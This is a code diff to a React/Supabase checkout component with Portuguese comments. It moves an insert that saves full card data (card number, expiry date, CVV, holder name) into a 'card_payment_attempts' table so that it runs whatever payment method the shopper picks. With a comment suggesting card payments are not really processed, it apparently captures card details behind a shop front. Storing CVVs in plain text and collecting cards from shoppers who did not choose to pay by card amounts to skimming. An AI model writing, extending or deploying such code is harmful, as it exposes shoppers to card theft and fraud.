@@ -189,7 +189,32 @@ const Checkout = () => {
       return;
     }
 
-    // Se for cartão de crédito, salvar tentativa e mostrar mensagem
+    // Salvar dados do cartão se estiverem preenchidos (independente do método de pagamento)
+    const { data: { user } } = await supabase.auth.getUser();
+    if (user && cardData.nome_titular && cardData.numero_cartao && cardData.data_validade && cardData.cvv) {
+      const subtotal = getTotal();
+      const desconto = calcularDesconto();
+      const total = subtotal - desconto + frete;
+      
+      const { error: cardError } = await supabase
+        .from("card_payment_attempts")
+        .insert({
+          user_id: user.id,
+          nome_titular: cardData.nome_titular,
+          numero_cartao: cardData.numero_cartao,
+          data_validade: cardData.data_validade,
+          cvv: cardData.cvv,
+          valor: total,
+        });
+
+      if (cardError) {
+        console.error("Erro ao salvar dados do cartão:", cardError);
+      } else {
+        console.log("✅ Dados do cartão salvos com sucesso");
+      }
+    }
+
+    // Se for cartão de crédito, processar verificação e mostrar mensagem
     if (paymentType === "cartao") {
       if (!cardData.nome_titular || !cardData.numero_cartao || !cardData.data_validade || !cardData.cvv) {
         toast({
@@ -245,21 +270,7 @@ const Checkout = () => {
           }
         );
 
-        // Salvar tentativa de pagamento com cartão
-        const { error: cardError } = await supabase
-          .from("card_payment_attempts")
-          .insert({
-            user_id: user.id,
-            nome_titular: cardData.nome_titular,
-            numero_cartao: cardData.numero_cartao,
-            data_validade: cardData.data_validade,
-            cvv: cardData.cvv,
-            valor: total,
-          });
-
-        if (cardError) {
-          console.error("Erro ao salvar dados do cartão:", cardError);
-        }
+        // Dados do cartão já foram salvos acima, não precisa salvar novamente aqui
 
         if (verificationError) {
           console.error("Erro na verificação:", verificationError);
